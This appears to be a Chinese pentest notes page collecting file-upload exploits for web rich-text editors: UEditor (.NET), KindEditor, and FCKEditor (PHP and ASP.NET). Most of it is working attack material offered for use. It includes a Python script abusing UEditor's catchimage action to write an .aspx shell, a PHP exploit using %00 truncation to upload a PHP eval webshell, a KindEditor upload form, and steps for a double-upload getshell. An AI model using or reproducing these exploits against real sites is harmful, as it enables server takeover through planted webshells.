## [.Net版]-Ueditor编辑器文件上传

**漏洞概述**

```http
#影响范围
1.4.3.3
```

在抓取远程数据源的时候未对文件后缀名做验证导致任意文件写入漏洞，黑客利用此漏洞可以在服务器上执行任意指令

**漏洞利用**

```python
import requests
import re

def upload():
    url = 'http://www.test.com/ueditor/controller.ashx' # www.test.com/xxx/xxx/controller.ashx
    photo_shell = 'http://www.test.com/1.gif' #photo_shell
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1'
        }
    req = requests.post(url=url+'?action=catchimage',headers=headers,data='source[]='+photo_shell+'?.aspx',verify=False)
    
    if re.search('SUCCESS',req.text):
        print('[+] 上传成功！ 请查看响应包内容！')
    else:
        print('[-] 上传失败！ 请查看响应包内容！')
    print(req.text)

if __name__ == '__main__':
    upload()
```

## Kindeditor文件上传

```html
<html>
<head>
<title>Uploader</title>
<script src="kindeditor-all.js"></script>
<script>
KindEditor.ready(function(K) {xxx
var uploadbutton = K.uploadbutton({
button : K('#uploadButton')[0],
fieldName : 'imgFile',
url : 'http://xxxx/public/editor/php/upload_json.php?dir=file',
afterUpload : function(data) {
if (data.error === 0) {
var url = K.formatUrl(data.url, 'absolute');
K('#url').val(url);}
},
}); 
uploadbutton.fileBox.change(function(e) { 
uploadbutton.submit();
});
});
</script></head><body>
<div class="upload">
<input class="ke-input-text" type="text" id="url" value="" readonly="readonly" />
<input type="button" id="uploadButton" value="Upload" />
</div>
</body>
</html>
```



## [PHP]-FCKEditor <= 2.6.4 任意文件上传

**判断版本**

```http
/fckeditor/editor/dialog/fck_about.html
/FCKeditor/_whatsnew.html
```

currentfolder过滤不严，导致%00截断上传任意文件

**POC**

```php
<?
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
define(STDIN, fopen("php://stdin", "r"));
$match = array();
function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	print $resp;
	return $resp;
}
function connector_response($html)
{
	global $match;
	return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));
}
print "\n+------------------------------------------------------------------+";
print "\n| FCKEditor Servelet Arbitrary File Upload Exploit by Wolegequ     |";
print "\n+------------------------------------------------------------------+\n";
if ($argv < 3)
{
	print "\nUsage......: php $argv[0] host path\n";
	print "\nExample....: php $argv[0] localhost /\n";
	print "\nExample....: php $argv[0] localhost /FCKEditor/\n";
	die();
}
$host = $argv[1];
$path = ereg_replace("(/){2,}", "/", $argv[2]);
$filename  = "fvck.gif";
$foldername = "fuck.php%00.gif";
$connector = "editor/filemanager/connectors/php/connector.php";
$payload  = "-----------------------------265001916915724\r\n";
$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";
$payload .= "Content-Type:  image/jpeg\r\n\r\n";
$payload .= 'GIF89a'."\r\n".'<?php eval($_POST[a]) ?>'."\n";
$payload .= "-----------------------------265001916915724--\r\n";
$packet	 = "POST {$path}{$connector}?Command=FileUpload&Type=Image&CurrentFolder=".$foldername." HTTP/1.0\r\n";
//print $packet;
$packet	.= "Host: {$host}\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;
print $packet;
if (!connector_response(http_send($host, $packet))) die("\n[-] Upload failed!\n");
else print "\n[-] Job done! try http://${host}/$match[2] \n";
?>
```

## [ASP.net]-FCKEditor 2.6.8 任意文件上传

**判断版本**

```http
/fckeditor/editor/dialog/fck_about.html
/FCKeditor/_whatsnew.html
```

```
上传一个webshell然后抓包修改扩展名为func.aspx%00txt

第一次上传文件名被修改为shell.aspx_txt

第二次上传同名文件，成功getshell-> shell(1).apsx
```

